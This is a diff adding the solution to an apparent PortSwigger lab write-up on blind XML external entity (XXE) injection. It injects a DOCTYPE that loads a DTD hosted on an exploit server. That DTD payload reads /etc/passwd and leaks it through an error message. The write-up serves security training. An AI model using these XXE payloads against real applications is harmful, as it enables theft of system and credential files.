@@ -139,3 +139,25 @@ The lab contains a link to an exploit server on a different domain where you can
 
 ### Sol :
 
+* Click `check stock`, Intercept the request and send it to the repeater.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1fdc3ff1-6307-4364-ab33-b019b34f3597)
+
+* Give the below payload as external entity definition in between the XML declaration and the stockCheck element by giving your own DTD URL.
+
+        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/884e11b1-b0fa-4180-a40d-9676e111d0da)
+
+* Go to exploit server and give the below payload and save it as `dtd` file.
+
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+        %eval;
+        %exfil;
+  
+* Click `store` and `View exploit`. Note the URL and give it to the external tag.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d0839d65-60d6-436c-aa60-711ccab79fdd)
+
+* We got the `passwd` file and lab is solved.
